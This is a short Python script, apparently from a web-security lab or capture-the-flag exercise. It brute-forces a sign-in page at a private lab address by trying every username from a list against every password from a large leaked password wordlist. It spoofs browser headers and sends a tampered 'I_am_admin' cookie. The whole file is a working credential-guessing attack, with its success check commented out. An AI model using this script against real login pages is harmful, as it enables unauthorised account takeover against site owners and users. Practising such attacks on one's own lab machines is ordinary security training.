import requests

# Configuration
url = 'http://192.168.56.101/index.php'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer': 'http://192.168.56.101/index.php?page=signin',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}
cookies = {
    'I_am_admin': '68934a3e9455fa72420237eb05902327'
}

# Lire la liste des noms d'utilisateur à partir d'un fichier
with open('username_list.txt', 'r') as file:
    username_list = [line.strip() for line in file]

# Lire la liste des mots de passe à partir d'un fichier
with open('xato-net-10-million-passwords.txt', 'r') as file:
    password_list = [line.strip() for line in file]

# Double boucle pour tester chaque combinaison de nom d'utilisateur et mot de passe
for username in username_list:
    for password in password_list:
        params = {
            'page': 'signin',
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        response = requests.get(url, params=params, headers=headers, cookies=cookies)
        
        ##if "WrongAnswer.gif" not in response.text:
            ##print(f'Succès : Combiné trouvé - {username}/{password}')
            ##exit(1)
        ##else:
            ##print(f'Échec : {username}/{password}')
        print(f'{password}')
